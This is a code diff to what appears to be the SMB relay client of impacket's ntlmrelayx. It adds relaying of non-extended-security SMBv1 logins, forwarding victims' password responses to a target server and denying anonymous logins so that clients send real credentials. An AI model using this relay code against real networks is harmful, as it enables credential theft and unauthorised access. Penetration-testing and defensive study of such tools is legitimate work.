@@ -14,14 +14,16 @@
 #  This is the SMB client which initiates the connection to an
 # SMB server and relays the credentials to this server.
 
+import os
+
 from struct import unpack
 from impacket import LOG
 from impacket.examples.ntlmrelayx.clients import ProtocolClient
-from impacket.nt_errors import STATUS_SUCCESS
+from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED, STATUS_LOGON_FAILURE
 from impacket.ntlm import NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallenge
 from impacket.smb import SMB, NewSMBPacket, SMBCommand, SMBSessionSetupAndX_Extended_Parameters, \
     SMBSessionSetupAndX_Extended_Data, SMBSessionSetupAndX_Extended_Response_Data, \
-    SMBSessionSetupAndX_Extended_Response_Parameters
+    SMBSessionSetupAndX_Extended_Response_Parameters, SMBSessionSetupAndX_Data, SMBSessionSetupAndX_Parameters
 from impacket.smb3 import SMB3, SMB2_GLOBAL_CAP_ENCRYPTION, SMB2_DIALECT_WILDCARD, SMB2Negotiate_Response, \
     SMB2_NEGOTIATE, SMB2Negotiate, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30, SMB2_GLOBAL_CAP_LEASING, \
     SMB3Packet, SMB2_GLOBAL_CAP_LARGE_MTU, SMB2_GLOBAL_CAP_DIRECTORY_LEASING, SMB2_GLOBAL_CAP_MULTI_CHANNEL, \
@@ -136,10 +138,14 @@ class SMBRelayClient(ProtocolClient):
         else:
             data = '\x02NT LM 0.12\x00'
 
+        if self.extendedSecurity is True:
+            flags2 = SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
+        else:
+            flags2 = SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
+
         packet = self.session.negotiateSessionWildcard(None, self.targetHost, self.targetHost, self.targetPort, 60, self.extendedSecurity,
                                               flags1=SMB.FLAGS1_PATHCASELESS | SMB.FLAGS1_CANONICALIZED_PATHS,
-                         flags2=SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES,
-                         data=data)
+                         flags2=flags2, data=data)
         if packet[0] == '\xfe':
             smbClient = MYSMB3(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(), negPacket=packet)
             pass
@@ -262,6 +268,51 @@ class SMBRelayClient(ProtocolClient):
             respToken = SPNEGO_NegTokenResp(sessionData['SecurityBlob'])
 
             return respToken['ResponseToken']
+
+    def sendStandardSecurityAuth(self, sessionSetupData):
+        v1client = self.session.getSMBServer()
+        flags2 = v1client.get_flags()[1]
+        v1client.set_flags(flags2=flags2 & (~SMB.FLAGS2_EXTENDED_SECURITY))
+        if sessionSetupData['Account'] != '':
+            smb = NewSMBPacket()
+            smb['Flags1'] = 8
+
+            sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
+            sessionSetup['Parameters'] = SMBSessionSetupAndX_Parameters()
+            sessionSetup['Data'] = SMBSessionSetupAndX_Data()
+
+            sessionSetup['Parameters']['MaxBuffer'] = 65535
+            sessionSetup['Parameters']['MaxMpxCount'] = 2
+            sessionSetup['Parameters']['VCNumber'] = os.getpid()
+            sessionSetup['Parameters']['SessionKey'] = v1client._dialects_parameters['SessionKey']
+            sessionSetup['Parameters']['AnsiPwdLength'] = len(sessionSetupData['AnsiPwd'])
+            sessionSetup['Parameters']['UnicodePwdLength'] = len(sessionSetupData['UnicodePwd'])
+            sessionSetup['Parameters']['Capabilities'] = SMB.CAP_RAW_MODE
+
+            sessionSetup['Data']['AnsiPwd'] = sessionSetupData['AnsiPwd']
+            sessionSetup['Data']['UnicodePwd'] = sessionSetupData['UnicodePwd']
+            sessionSetup['Data']['Account'] = str(sessionSetupData['Account'])
+            sessionSetup['Data']['PrimaryDomain'] = str(sessionSetupData['PrimaryDomain'])
+            sessionSetup['Data']['NativeOS'] = 'Unix'
+            sessionSetup['Data']['NativeLanMan'] = 'Samba'
+
+            smb.addCommand(sessionSetup)
+
+            v1client.sendSMB(smb)
+            smb = v1client.recvSMB()
+            try:
+                smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
+            except:
+                return None, STATUS_LOGON_FAILURE
+            else:
+                v1client.set_uid(smb['Uid'])
+                return smb, STATUS_SUCCESS
+        else:
+            # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
+            clientResponse = None
+            errorCode = STATUS_ACCESS_DENIED
+
+        return clientResponse, errorCode
 
     def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
         if unpack('B', str(authenticateMessageBlob)[:1])[0] != SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
